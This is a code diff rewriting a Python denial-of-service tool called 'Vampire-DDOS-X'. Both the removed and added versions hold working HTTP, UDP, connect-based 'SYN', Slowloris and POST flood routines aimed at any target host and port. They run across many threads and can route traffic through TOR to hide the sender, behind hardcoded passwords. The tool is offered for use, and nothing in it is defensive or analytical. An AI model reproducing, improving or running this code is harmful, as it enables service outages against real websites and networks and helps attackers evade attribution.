@@ -1,205 +1,182 @@
-#!/usr/bin/env python3
-
 import os
 import sys
 import time
 import socket
 import threading
-import subprocess
 import random
+import subprocess
 
-try:
-    import socks
-    from colorama import Fore, Style, init
-except ImportError:
-    print("[*] Missing modules detected. Installing...")
-    subprocess.call([sys.executable, "-m", "pip", "install", "pysocks", "colorama"])
-    import socks
-    from colorama import Fore, Style, init
+# Auto-install required modules
+def install(module, pip_name=None):
+    pip_name = pip_name or module
+    try:
+        __import__(module)
+    except ImportError:
+        subprocess.call([sys.executable, '-m', 'pip', 'install', pip_name])
+
+install("colorama")
+install("socks", "pysocks")
+
+from colorama import Fore, Style, init
+import socks
 
 init(autoreset=True)
 
-# Credentials
+# Admin Passwords
 ADMIN_PASSWORD = "SH404"
 TOR_PASSWORD = "SH404"
 
+# Global Counters
+requests_sent = 0
+threads_running = 0
+attack_active = True
+
 # Banners
-def admin_banner():
-    print(Fore.RED + Style.BRIGHT + r"""
-██╗░░░██╗███████╗██████╗░██╗░░░██╗
-██║░░░██║██╔════╝██╔══██╗██║░░░██║
-██║░░░██║█████╗░░██████╔╝██║░░░██║
-██║░░░██║██╔══╝░░██╔═══╝░██║░░░██║
-╚██████╔╝███████╗██║░░░░░╚██████╔╝
-░╚═════╝░╚══════╝╚═╝░░░░░░╚═════╝░
-       Vampire-X Admin Panel
-""" + Style.RESET_ALL)
+admin_banner = f"""
+{Fore.RED}
+╔══════════════════════════════════════════════╗
+║       █████▒▒▒ ADMIN PANEL ▒▒▒█████         ║
+║    ╔═╗╔═╗╔╦╗╔═╗╦═╗╦╔═╗╔═╗╔═╗  ╔═╗╦ ╦         ║
+║    ╚═╗║╣  ║║║╣ ╠╦╝║║ ╦║╣ ╚═╗  ║ ╦║ ║         ║
+║    ╚═╝╚═╝═╩╝╚═╝╩╚═╩╚═╝╚═╝╚═╝  ╚═╝╚═╝         ║
+║            [Vampire-DDOS-X]                 ║
+║        Developed by: Muhammad Shourov       ║
+╚══════════════════════════════════════════════╝
+"""
 
-def user_banner():
-    print(Fore.CYAN + Style.BRIGHT + r"""
-██    ██ ██████  ██████  ██    ██ ██ 
-██████  ███████     ██ ██    ██ ██ 
-██   ██ ██   ██ ██    ██ ██ ██   ██ 
-██          ██ ██    ██ ██████  ██████ 
-██    ██ ██      ██      ██ ██   ██ ██ 
-██████  ██ ██████  ███████     ██
-       Vampire-X User Panel
-""" + Style.RESET_ALL)
+user_banner = f"""
+{Fore.CYAN}
+╔══════════════════════════════════════════════╗
+║       █████▒▒▒ USER PANEL ▒▒▒█████          ║
+║    ██    ██ ██████  ██████  ██    ██        ║
+║    ██    ██ ██   ██ ██   ██ ██    ██        ║
+║    ██    ██ ██████  ██████  ██    ██        ║
+║    ██    ██ ██      ██      ██    ██        ║
+║     ██████  ██      ██       ██████         ║
+║          [Vampire-DDOS-X]                   ║
+║      Created by: Muhammad Shourov           ║
+╚══════════════════════════════════════════════╝
+"""
 
-# TOR Setup
-def setup_tor():
-    print(Fore.YELLOW + "[*] Checking for TOR...")
-    result = subprocess.run(['which', 'tor'], stdout=subprocess.DEVNULL)
-    if result.returncode != 0:
-        print(Fore.YELLOW + "[+] TOR not found. Installing...")
-        os.system("pkg install tor -y")
-    else:
-        print(Fore.GREEN + "[✓] TOR already installed.")
+def install_tor():
+    try:
+        subprocess.call(['pkg', 'install', '-y', 'tor'])
+    except:
+        print("[!] TOR installation failed. Please install manually.")
 
-    torrc_path = os.path.expanduser("~/.torrc")
-    if not os.path.exists(torrc_path):
-        with open(torrc_path, 'w') as f:
-            f.write("SOCKSPort 9050\n")
+def enable_tor():
+    print("[?] Enable Anonymous Mode (TOR)? (y/n): ", end='')
+    if input().lower() == 'y':
+        password = input("Enter TOR password: ")
+        if password == TOR_PASSWORD:
+            print("[✓] Enabling TOR routing...")
+            install_tor()
+            os.system("tor &")
+            time.sleep(5)
+            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+            socket.socket = socks.socksocket
+            print("[✓] TOR routing enabled.")
+        else:
+            print("[!] Wrong TOR password. Skipping...")
 
-    print(Fore.YELLOW + "[*] Starting TOR...")
-    subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(6)
-    print(Fore.GREEN + "[✓] TOR routing enabled.")
-
-# Attack Types
-def http_flood(target, port, use_tor):
-    def ddos():
-        try:
-            s = socks.socksocket()
-            if use_tor:
-                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
-            s.connect((target, port))
-            while True:
-                ua = f"User-Agent: Dracula-{random.randint(1000,9999)}"
-                req = f"GET / HTTP/1.1\r\nHost: {target}\r\n{ua}\r\n\r\n"
-                s.send(req.encode())
-        except:
-            pass
-
-    for _ in range(threads):
-        threading.Thread(target=ddos).start()
-
-def udp_flood(target, port):
-    def flood():
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        payload = random._urandom(1024)
-        while True:
-            s.sendto(payload, (target, port))
-
-    for _ in range(threads):
-        threading.Thread(target=flood).start()
-
-def syn_flood(target, port):
-    def flood():
-        s = socket.socket()
-        while True:
+def attack(target, port, attack_type):
+    global requests_sent, threads_running, attack_active
+    threads_running += 1
+    try:
+        while attack_active:
             try:
-                s.connect((target, port))
+                if attack_type == "2":
+                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    s.sendto(random._urandom(1024), (target, port))
+                else:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((target, port))
+                    if attack_type == "1":
+                        req = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
+                        s.send(req.encode())
+                    elif attack_type == "3":
+                        s.send(b"\x00" * 1024)
+                    elif attack_type == "4":
+                        for _ in range(50):
+                            s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
+                            time.sleep(0.5)
+                    elif attack_type == "5":
+                        payload = "username=admin&password=admin"
+                        headers = f"POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{payload}"
+                        s.send(headers.encode())
+                s.close()
+                requests_sent += 1
             except:
-                pass
+                continue
+    finally:
+        threads_running -= 1
 
-    for _ in range(threads):
-        threading.Thread(target=flood).start()
+def show_stats():
+    while attack_active:
+        print(f"{Fore.YELLOW}[~] Requests Sent: {requests_sent} | Threads Running: {threads_running}{Style.RESET_ALL}", end='\r')
+        time.sleep(1)
 
-def slowloris(target, port):
-    def attack():
-        try:
-            s = socket.socket()
-            s.connect((target, port))
-            s.send(b"GET / HTTP/1.1\r\n")
-            while True:
-                s.send(b"X-a: b\r\n")
-                time.sleep(15)
-        except:
-            pass
-
-    for _ in range(threads):
-        threading.Thread(target=attack).start()
-
-def post_flood(target, port):
-    def attack():
-        try:
-            s = socket.socket()
-            s.connect((target, port))
-            data = f"POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 1000\r\n\r\n"
-            s.send(data.encode())
-        except:
-            pass
-
-    for _ in range(threads):
-        threading.Thread(target=attack).start()
-
-# Main App
 def main():
-    os.system("clear")
-    mode = input(Fore.MAGENTA + "[?] Enter Mode (admin/user): ").strip().lower()
-
+    print(f"{Fore.CYAN}[?] Enter Mode (admin/user): {Style.RESET_ALL}", end='')
+    mode = input().strip().lower()
     if mode == "admin":
-        passwd = input(Fore.YELLOW + "[!] Admin Password: ")
-        if passwd != ADMIN_PASSWORD:
-            print(Fore.RED + "[X] Incorrect password!")
-            sys.exit()
-        admin_banner()
-    elif mode == "user":
-        user_banner()
+        pw = input("Enter Admin Password: ")
+        if pw != ADMIN_PASSWORD:
+            print("[!] Wrong password. Access denied.")
+            return
+        print(admin_banner)
     else:
-        print(Fore.RED + "[X] Invalid mode selected!")
+        print(user_banner)
+
+    enable_tor()
+
+    try:
+        target = input("[+] Target IP/Host: ").strip()
+        port = int(input("[+] Target Port: "))
+        if port <= 0 or port > 65535:
+            print("[!] Invalid port number.")
+            return
+        threads = int(input("[+] Threads Count: "))
+        if threads <= 0:
+            print("[!] Thread count must be positive.")
+            return
+    except ValueError:
+        print("[!] Invalid input. Please enter numbers where required.")
         return
 
-    anon = input(Fore.MAGENTA + "[?] Enable Anonymous Mode (TOR)? (y/n): ").strip().lower()
-    use_tor = False
+    print("""
+[?] Select Attack Type:
 
-    if anon == 'y':
-        tor_pass = input(Fore.YELLOW + "[!] Enter TOR password: ")
-        if tor_pass == TOR_PASSWORD:
-            setup_tor()
-            use_tor = True
-        else:
-            print(Fore.RED + "[X] Wrong TOR password!")
-            return
+1. HTTP Flood
+2. UDP Flood
+3. SYN Flood
+4. Slowloris
+5. POST Flood
+""")
+    attack_type = input("[+] Choice: ").strip()
+    if attack_type not in ["1", "2", "3", "4", "5"]:
+        print("[!] Invalid attack type.")
+        return
+
+    print(f"{Fore.GREEN}[✓] Attack started on {target}:{port} using mode {attack_type} with {threads} threads.{Style.RESET_ALL}")
+    time.sleep(1)
+
+    threading.Thread(target=show_stats).start()
+    for _ in range(threads):
+        t = threading.Thread(target=attack, args=(target, port, attack_type))
+        t.daemon = True
+        t.start()
 
     try:
-        global threads
-        target = input(Fore.CYAN + "[+] Target IP/Host: ").strip()
-        port = int(input("[+] Target Port: "))
-        threads = int(input("[+] Threads Count: "))
-
-        print(Fore.MAGENTA + "[?] Select Attack Type:")
-        print("1. HTTP Flood")
-        print("2. UDP Flood")
-        print("3. SYN Flood")
-        print("4. Slowloris")
-        print("5. POST Flood")
-        choice = input(Fore.YELLOW + "[+] Choice: ")
-
-        attack_funcs = {
-            "1": http_flood,
-            "2": udp_flood,
-            "3": syn_flood,
-            "4": slowloris,
-            "5": post_flood
-        }
-
-        if choice in attack_funcs:
-            if choice == "1":
-                attack_funcs[choice](target, port, use_tor)
-            else:
-                attack_funcs[choice](target, port)
-            print(Fore.GREEN + f"[✓] Attack started on {target}:{port} using mode {choice} with {threads} threads.")
-        else:
-            print(Fore.RED + "[X] Invalid attack type!")
-
-    except Exception as e:
-        print(Fore.RED + f"[!] Error: {e}")
-        subprocess.call([sys.executable, "-m", "pip", "install", "pysocks", "colorama"])
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        global attack_active
+        attack_active = False
+        print(f"\n{Fore.RED}[!] Attack stopped by user.{Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA}[#] Total Requests Sent: {requests_sent}{Style.RESET_ALL}")
+        os.system("pkill tor")
+        print(f"{Fore.RED}[X] Shutting down Vampire-DDOS-X... Stay lethal!{Style.RESET_ALL}")
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(Fore.YELLOW + "\n[!] Interrupted by user. Exiting...")
+    main()
